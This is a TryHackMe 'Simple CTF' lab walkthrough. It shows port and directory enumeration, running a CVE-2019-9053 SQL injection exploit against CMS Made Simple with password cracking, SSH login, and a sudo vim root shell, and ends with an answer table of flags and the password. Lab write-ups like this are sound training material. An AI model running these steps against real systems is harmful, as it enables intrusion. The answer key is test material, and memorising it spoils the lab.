
# TryHackMe — Simple CTF Walkthrough

## Enumeration

Started with Nmap:
```bash
nmap -sV -p 1-3000 TARGET_IP
```

![Nmap scan](images/0_U2ZNEewi6Nz_UmKr.webp)

Found 3 open ports:
- Port 21: FTP (vsftpd 3.0.3)
- Port 80: HTTP (Apache 2.4.18)
- Port 2222: SSH (OpenSSH 7.2p2)

Note: SSH is on non-standard port 2222.

Visited port 80, found Apache default page:

![Apache default](images/0_jxVfJB2k-iX9sAkq.webp)

Ran Gobuster for directory enumeration:
```bash
gobuster dir -u http://TARGET_IP -w directory-list-2.3-small.txt
```

![Gobuster](images/0_yf64HQMhzbIlTEl0.webp)

Found `/simple` directory. Navigated to it:

![CMS Made Simple](images/0_79U-PhsOlt3N0nKf.webp)

Footer reveals CMS Made Simple version 2.2.8:

![Version disclosure](images/0_xmXr74ATekayUOph.webp)

## CVE Research

Searched cve.mitre.org for CMS Made Simple 2.2.8 vulnerabilities:

![CVE search](images/0_VHxnECUOIVPhVGY1.webp)

Found CVE-2019-9053: blind time-based SQL injection in the News module.

![CVE details](images/0_B6wpQmKqMXE_xTxS.webp)

Found exploit on Exploit-DB:

![Exploit-DB](images/0_fT_XEjj25EA4Sjsx.webp)

## Exploitation

Ran the CVE-2019-9053 exploit with password cracking:
```bash
python3 exploit.py -u http://TARGET_IP/simple -c -w /usr/share/wordlists/rockyou.txt
```

![Running exploit](images/0_A_do2IOhTaEbgTsx.webp)

Exploit extracted credentials:

![Credentials found](images/0_2-mYSAEDW7cckWN8.webp)

```
Username: mitch
Password: secret
```

## Initial Access

SSH on port 2222 with discovered credentials:
```bash
ssh mitch@TARGET_IP -p 2222
```

![SSH login](images/0_Fg27QmZYDWHCydLK.webp)

Got user flag:

![User flag](images/0_9Ulrd8OFAaF70J36.webp)

Checked other users in /home:

![Other user](images/0_oMvsA04GWI5EcQmY.webp)

Found another user: `sunbath`

## Privilege Escalation

Checked sudo permissions:
```bash
sudo -l
```

![sudo -l](images/0_TcW1hmeA0I0Mzgzs.webp)

User mitch can run `/usr/bin/vim` as root with NOPASSWD.

Used vim to spawn root shell (GTFObins):
```bash
sudo vim -c ':!/bin/bash'
```

![Vim privesc](images/0_3L6Yl9up77QBJOyf.webp)

Got root:

![Root shell](images/0_1AlfKaXs9lb27jti.webp)

Got root flag:

![Root flag](images/0_JBR3hX6eHnj48lhi.webp)

## Answers

| Question | Answer |
|----------|--------|
| Services under port 1000 | 2 |
| Higher port service | ssh |
| CVE used | CVE-2019-9053 |
| Vulnerability type | SQLi |
| Password | secret |
| Login location | ssh |
| User flag | G00d j0b, keep up! |
| Other user | sunbath |
| Privesc binary | vim |
| Root flag | W3ll d0n3. You made it! |
